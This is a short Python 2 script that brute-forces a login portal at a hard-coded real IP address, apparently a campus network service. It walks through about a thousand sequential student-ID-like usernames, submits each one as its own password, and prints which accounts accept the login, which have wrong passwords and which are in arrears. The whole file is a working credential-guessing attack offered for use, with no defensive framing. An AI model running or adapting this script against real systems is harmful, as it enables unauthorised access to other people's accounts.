#-*-coding:utf-8
import requests
from bs4 import BeautifulSoup

url='http://202.194.116.85/cgi-bin/do_login'
html = requests.get(url).content
def loop(num):
    user=str(num)
    post_data = {'username': user, 'password': user, 'drop': 0, 'type': 1, 'n': '100'}
    web_data = requests.post(url, data=post_data)
    if web_data.text=='password_error':
        print user+': shit\n'
    elif web_data.text=='status_error':
        print user+'：欠费\n'
    else:
        print user+':可以的\n'


    if num>201658503141:
        exit()
num=201651502101
for i in range(1 , 1000):
    loop(num)
    num=num+1
    
